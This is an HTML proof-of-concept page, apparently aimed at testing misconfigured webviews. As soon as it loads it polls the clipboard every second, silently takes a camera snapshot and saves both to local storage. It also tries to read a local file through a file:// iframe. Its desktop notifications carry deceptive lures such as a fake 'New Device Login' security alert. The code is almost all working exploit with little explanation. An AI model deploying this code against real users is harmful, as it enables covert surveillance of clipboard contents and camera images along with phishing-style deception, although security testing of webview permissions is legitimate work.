<!DOCTYPE html>
<html>
<head>
    <title>Security Permissions Exploit Demonstration</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
        }
        .hidden {
            display: none;
        }
        #capturedImage {
            max-width: 100%;
            height: auto;
            border: 1px solid #ddd;
        }
        .container {
            margin-bottom: 20px;
        }
        h3 {
            margin-bottom: 5px;
        }
        .data-box {
            border: 1px dashed #ccc;
            padding: 10px;
            min-height: 50px;
            word-wrap: break-word;
        }
    </style>
</head>
<body onload="initiateExploits();">
    <h1>Demonstrating Potential Webview Vulnerabilities</h1>
    <h2>Data captured for demonstration purposes without direct user interaction.</h2>

    <div class="container">
        <h3>Clipboard Data:</h3>
        <div id="clipboardData" class="data-box"></div>
    </div>

    <div class="container">
        <h3>Captured Image:</h3>
        <img id="capturedImage" class="hidden" />
    </div>

    <div class="container">
        <h3>LFI Test (Attempting to read D:/test.txt):</h3>
        <iframe id="lfiFrame" src="file:///D:/test.txt" style="width:100%; height:100px; border:1px solid #ccc;"></iframe>
        <p>In a secure browser, this will be blocked. In a misconfigured webview, it might render the file.</p>
    </div>

    <video id="videoElement" class="hidden" autoplay playsinline></video>

    <script>
        // --- Core Exploit Functions ---

        function getClipboardData() {
            setInterval(() => {
                if (navigator.clipboard && navigator.clipboard.readText) {
                    navigator.clipboard.readText().then((clipText) => {
                        const clipboardDataEl = document.getElementById("clipboardData");
                        if (clipText && clipboardDataEl.innerHTML !== clipText) {
                            clipboardDataEl.innerHTML = clipText;
                            saveToPersistentStorage('clipboardData', clipText);
                            // Updated to include a title and redirect URL
                            showNotification('Action Required: Clipboard Synced', 'Your clipboard data has been synced. Click to review.', 'https://www.google.com/search?q=clipboard+data+captured');
                        }
                    }).catch((err) => {
                        console.error("Clipboard access denied:", err);
                    });
                } else {
                    console.warn("Clipboard API not supported.");
                }
            }, 1000); // Poll every second
        }

        function requestCameraAccess() {
            const videoElement = document.getElementById('videoElement');
            const capturedImage = document.getElementById('capturedImage');
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then((stream) => {
                        videoElement.srcObject = stream;
                        videoElement.play();
                        setTimeout(() => {
                            captureImage(videoElement, capturedImage, stream);
                        }, 3000); // Capture after 3 seconds
                    }).catch((err) => {
                        console.error("Camera access denied:", err);
                    });
            }
        }

        function captureImage(videoElement, capturedImage, stream) {
            const canvas = document.createElement('canvas');
            canvas.width = videoElement.videoWidth;
            canvas.height = videoElement.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
            const imageDataUrl = canvas.toDataURL('image/png');
            capturedImage.src = imageDataUrl;
            capturedImage.classList.remove('hidden');

            saveToPersistentStorage('capturedImageData', imageDataUrl);
            // Updated to include a title and redirect URL
            showNotification('Security Alert: New Device Login', 'An image was captured from a new device login. Click to secure your account.', 'https://www.google.com/search?q=image+captured');

            stream.getTracks().forEach(track => track.stop());
        }

        // --- New Functions for Persistent Storage and Notifications ---

        function saveToPersistentStorage(key, value) {
            try {
                localStorage.setItem(key, value);
                console.log(`Data saved to persistent storage with key: ${key}`);
            } catch (e) {
                console.error("Error saving to persistent storage:", e);
            }
        }

        /**
         * Requests permission and shows a desktop notification that redirects on click.
         * @param {string} title - The title of the notification.
         * @param {string} body - The body text of the notification.
         * @param {string} redirectUrl - The URL to navigate to when the notification is clicked.
         */
        function showNotification(title, body, redirectUrl) {
            if ('Notification' in window) {
                Notification.requestPermission().then((permission) => {
                    if (permission === 'granted') {
                        const notification = new Notification(title, { body: body });

                        // Add the onclick event handler to redirect the user
                        notification.onclick = () => {
                            window.location.href = redirectUrl;
                        };
                    }
                });
            } else {
                console.warn("Notifications API not supported.");
            }
        }

        // --- Initiator ---

        function initiateExploits() {
            if ('Notification' in window) {
                Notification.requestPermission();
            }

            getClipboardData();
            requestCameraAccess();
        }
    </script>
</body>
</html>
